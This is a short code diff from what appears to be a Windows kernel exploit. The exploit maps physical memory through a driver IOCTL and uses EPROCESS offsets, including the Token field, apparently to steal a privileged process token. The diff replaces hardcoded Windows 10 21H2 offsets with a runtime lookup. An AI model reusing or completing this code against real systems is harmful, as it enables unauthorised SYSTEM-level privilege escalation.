@@ -12,9 +12,9 @@
 
 
 // Those offsets are for Windows 10 21H2
-unsigned __int64 _EPROCESS_ImageFileName_offset = 0x5a8;
-unsigned __int64 _EPROCESS_UniqueProcessId_offset = 0x440;
-unsigned __int64 _EPROCESS_Token_offset = 0x4b8;
+unsigned __int64 _EPROCESS_ImageFileName_offset = 0;
+unsigned __int64 _EPROCESS_UniqueProcessId_offset = 0;
+unsigned __int64 _EPROCESS_Token_offset = 0;
 
 
 void printBytes(void* ptr, int size)
@@ -30,6 +30,9 @@ int main(int argc, char** argv)
 {
 	// measure execution time of program
 	auto start = std::chrono::high_resolution_clock::now();
+	if (GetWindowsOffsets() == -1) {
+		fprintf(stderr, "[!] GetWindowsOffsets() failed");
+	}
 
 	HANDLE device = INVALID_HANDLE_VALUE;
 	NTSTATUS status = FALSE;
@@ -47,7 +50,7 @@ int main(int argc, char** argv)
 	}
 	HANDLE hPhysicalMemory = (HANDLE)calloc(1, sizeof(HANDLE));
 	if (hPhysicalMemory == NULL) {
-		fprintf(stderr, "calloc() failed");
+		fprintf(stderr, "[!] calloc() failed");
 		return FALSE;
 	}
 	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
